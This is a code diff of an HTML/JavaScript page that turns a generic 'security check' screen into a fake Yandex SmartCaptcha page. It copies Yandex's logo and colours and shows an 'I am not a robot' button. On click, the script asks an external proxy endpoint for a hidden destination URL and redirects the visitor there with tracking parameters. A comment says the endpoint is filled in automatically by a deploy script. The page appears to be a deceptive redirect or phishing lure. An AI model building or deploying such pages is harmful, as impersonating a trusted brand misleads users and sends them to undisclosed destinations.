@@ -8,20 +8,19 @@
     
     <style>
         :root {
-            --primary: #2563eb;
-            --primary-dark: #1d4ed8;
-            --bg-color: #f8fafc;
+            --ya-yellow: #fc0;
+            --ya-yellow-hover: #f2c200;
+            --ya-red: #f00;
+            --bg-color: #f3f3f2;
             --card-bg: #ffffff;
-            --text-head: #0f172a;
-            --text-body: #64748b;
-            --border-color: #e2e8f0;
-            --success: #10b981;
+            --text-head: #000000;
+            --text-body: #333333;
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
 
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
             background-color: var(--bg-color);
             color: var(--text-head);
             display: flex;
@@ -35,19 +34,93 @@
         .system-card {
             background: var(--card-bg);
             width: 100%;
-            max-width: 420px;
-            border-radius: 12px;
-            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05), 0 10px 15px -3px rgba(0, 0, 0, 0.05);
-            border: 1px solid var(--border-color);
-            overflow: hidden;
+            max-width: 400px;
+            border-radius: 16px;
+            box-shadow: 0 12px 24px rgba(0, 0, 0, 0.08);
+            padding: 40px 30px;
             text-align: center;
             position: relative;
+            overflow: hidden;
         }
 
+        .logo-area {
+            margin-bottom: 24px;
+        }
+
+        .ya-logo {
+            font-size: 28px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+        }
+        .ya-logo span { color: var(--ya-red); }
+
+        h1 {
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 12px;
+        }
+
+        p {
+            font-size: 15px;
+            color: var(--text-body);
+            line-height: 1.5;
+            margin-bottom: 32px;
+        }
+
+                .action-btn {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            padding: 16px;
+            background: var(--ya-yellow);
+            color: #000;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            box-shadow: 0 4px 12px rgba(255, 204, 0, 0.4);
+        }
+        .action-btn:hover { 
+            background: var(--ya-yellow-hover); 
+            box-shadow: 0 6px 16px rgba(255, 204, 0, 0.5);
+            transform: translateY(-2px);
+        }
+        .action-btn:active { 
+            transform: translateY(1px);
+            box-shadow: 0 2px 6px rgba(255, 204, 0, 0.4);
+        }
+
+        .loader-ui {
+            display: none;
+            width: 22px;
+            height: 22px;
+            border: 2px solid rgba(0,0,0,0.2);
+            border-radius: 50%;
+            border-top-color: #000;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        
+        .action-btn.active {
+            pointer-events: none;
+            opacity: 0.8;
+        }
+        .action-btn.active .btn-lbl { display: none; }
+        .action-btn.active .loader-ui { display: block; }
+
+        .tech-footer {
+            margin-top: 30px;
+            font-size: 12px;
+            color: #999;
+        }
+    
         .loading-bar {
             height: 4px;
             width: 100%;
-            background: #eff6ff;
+            background: #f3f3f2;
             position: absolute;
             top: 0;
             left: 0;
@@ -55,162 +128,39 @@
         .loading-bar::after {
             content: '';
             position: absolute;
-            left: 0;
+            left: -30%;
             top: 0;
             height: 100%;
             width: 30%;
-            background: var(--primary);
+            background: var(--ya-red);
             animation: load 2s infinite ease-in-out;
         }
         @keyframes load { 0% { left: -30%; } 100% { left: 100%; } }
-
-        .card-content {
-            padding: 40px 30px;
-        }
-
-        .icon-area {
-            position: relative;
-            width: 80px;
-            height: 80px;
-            margin: 0 auto 25px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .icon-circle {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            border-radius: 50%;
-            background: #dbeafe;
-            opacity: 0.5;
-            animation: pulse 2s infinite;
-        }
-        .icon-circle:nth-child(2) {
-            width: 70%;
-            height: 70%;
-            background: #bfdbfe;
-            animation-delay: 0.5s;
-            opacity: 0.8;
-        }
-        .icon-svg {
-            position: relative;
-            width: 40px;
-            height: 40px;
-            color: var(--primary);
-            z-index: 2;
-        }
-        @keyframes pulse {
-            0% { transform: scale(0.95); opacity: 0.5; }
-            50% { transform: scale(1.05); opacity: 0.8; }
-            100% { transform: scale(0.95); opacity: 0.5; }
-        }
-
-        h1 {
-            font-size: 20px;
-            font-weight: 700;
-            color: var(--text-head);
-            margin-bottom: 10px;
-            letter-spacing: -0.01em;
-        }
-
-        p {
-            font-size: 15px;
-            color: var(--text-body);
-            line-height: 1.6;
-            margin-bottom: 30px;
-        }
-
-        .action-btn {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            width: 100%;
-            padding: 16px;
-            background: var(--primary);
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s;
-            box-shadow: 0 4px 6px -1px rgba(37, 99, 235, 0.2);
-        }
-        .action-btn:hover {
-            background: var(--primary-dark);
-            transform: translateY(-1px);
-        }
-        .action-btn:active {
-            transform: translateY(1px);
-        }
-
-        .loader-ui {
-            display: none;
-            width: 20px;
-            height: 20px;
-            border: 2px solid rgba(255,255,255,0.3);
-            border-radius: 50%;
-            border-top-color: #fff;
-            animation: spin 0.8s linear infinite;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        
-        .action-btn.active {
-            background: #94a3b8;
-            pointer-events: none;
-            cursor: default;
-        }
-        .action-btn.active .btn-lbl { display: none; }
-        .action-btn.active .loader-ui { display: block; }
-
-        .tech-footer {
-            margin-top: 25px;
-            padding-top: 20px;
-            border-top: 1px solid var(--border-color);
-            font-size: 11px;
-            color: #94a3b8;
-            display: flex;
-            justify-content: space-between;
-            font-family: monospace;
-        }
-
     </style>
 </head>
 <body>
 
     <div class="system-card">
         <div class="loading-bar"></div>
+        <div class="logo-area">
+            <div class="ya-logo"><span>Я</span>ндекс</div>
+        </div>
+        <h1>Проверка безопасности</h1>
+        <p>Пожалуйста, подтвердите, что вы не робот, чтобы продолжить.</p>
         
-        <div class="card-content">
-            <div class="icon-area">
-                <div class="icon-circle"></div>
-                <div class="icon-circle"></div>
-                <svg class="icon-svg" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
-                    <path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
-                </svg>
-            </div>
+        <button id="submitAction" class="action-btn">
+            <span class="btn-lbl">Я не робот</span>
+            <div class="loader-ui"></div>
+        </button>
 
-            <h1>Проверка безопасности</h1>
-            <p>
-                Система проверяет ваше соединение на наличие автоматических угроз.
-            </p>
-
-            <div id="statusContainer" style="margin-top: 25px; padding: 16px 20px; background: #eff6ff; border-radius: 8px; border: 1px solid #bfdbfe; color: var(--primary-dark); font-weight: 600; font-size: 15px; display: flex; align-items: center; justify-content: center; gap: 12px; box-shadow: inset 0 2px 4px rgba(0,0,0,0.02);">
-                <span>Автоматическая проверка браузера...</span>
-                <div class="loader-ui" style="display: block; border: 2px solid rgba(37, 99, 235, 0.2); border-top-color: var(--primary); width: 18px; height: 18px;"></div>
-            </div>
-
-            <div class="tech-footer">
-                <span>Ray ID: <script>document.write(Math.random().toString(36).substr(2, 9).toUpperCase())</script></span>
-                <span>Security Check v4.2</span>
-            </div>
+        <div class="tech-footer">
+            Защищено SmartCaptcha
         </div>
     </div>
 
     <script>
         // ПРОКСИ API БУДЕТ ПОДСТАВЛЕН АВТОМАТИЧЕСКИ СКРИПТОМ DEPLOY
-        const MY_PROXY_API = "https://post517-my-redirects.hf.space/api.php";
+        const MY_PROXY_API = "https://redirect-security-check.netlify.app/api/get_url";
 
         function appendUtmSource(targetUrl) {
             try {
@@ -227,62 +177,32 @@
             return targetUrl;
         }
 
-        document.addEventListener('DOMContentLoaded', async function() {
-            const statusContainer = document.getElementById('statusContainer');
-            let errMsg = document.getElementById('errorMsg');
-            if (!errMsg) {
-                errMsg = document.createElement('div');
-                errMsg.id = 'errorMsg';
-                errMsg.style.color = '#ef4444';
-                errMsg.style.fontSize = '13px';
-                errMsg.style.marginTop = '10px';
-                errMsg.style.display = 'none';
-                statusContainer.parentNode.insertBefore(errMsg, statusContainer.nextSibling);
-            }
-            
-            const minDelay = 2000;
-            const maxWait = 5000;
-            const start = Date.now();
+        document.addEventListener('DOMContentLoaded', function() {
+            const btn = document.getElementById('submitAction');
 
-            const fetchPromise = fetch(MY_PROXY_API)
-                .then(response => response.json())
-                .then(data => {
-                    if (data && data.success && data.url) {
-                        return data.url;
+            btn.addEventListener('click', async function(evt) {
+                evt.preventDefault();
+                btn.classList.add('active');
+
+                try {
+                    const response = await fetch(MY_PROXY_API);
+                    const data = await response.json();
+                    
+                    if (data.success && data.url) {
+                        window.location.href = appendUtmSource(data.url);
+                    } else {
+                        console.error('Security verification failed: No URL returned');
+                        btn.classList.remove('active');
+                        btn.querySelector('.btn-lbl').innerText = 'Ошибка. Попробовать еще раз';
+                        btn.style.background = '#ef4444'; 
                     }
-                    throw new Error(data.error || 'Unknown Error');
-                });
-
-            const timeoutPromise = new Promise((_, reject) => {
-                setTimeout(() => reject(new Error('Превышено время ожидания ответа от сервера.')), maxWait);
+                } catch (error) {
+                    console.error("Proxy Fetch Error:", error);
+                    btn.classList.remove('active');
+                    btn.querySelector('.btn-lbl').innerText = 'Ошибка соединения';
+                    btn.style.background = '#ef4444';
+                }
             });
-
-            Promise.race([fetchPromise, timeoutPromise])
-                .then((url) => {
-                    const elapsed = Date.now() - start;
-                    const remainingDelay = Math.max(0, minDelay - elapsed);
-                    
-                    setTimeout(() => {
-                        const finalUrl = appendUtmSource(url);
-                        try {
-                            window.top.location.href = finalUrl;
-                        } catch (e) {}
-                        setTimeout(() => {
-                            window.location.href = finalUrl;
-                        }, 100);
-                    }, remainingDelay);
-                })
-                .catch(err => {
-                    console.error(err);
-                    const elapsed = Date.now() - start;
-                    const remainingDelay = Math.max(0, minDelay - elapsed);
-                    
-                    setTimeout(() => {
-                        statusContainer.innerHTML = '<span style="color:#ef4444;">Ошибка проверки. Пожалуйста, обновите страницу.</span>';
-                        errMsg.style.display = 'block';
-                        errMsg.textContent = "Ошибка: " + err.message;
-                    }, remainingDelay);
-                });
         });
     </script>
 </body>
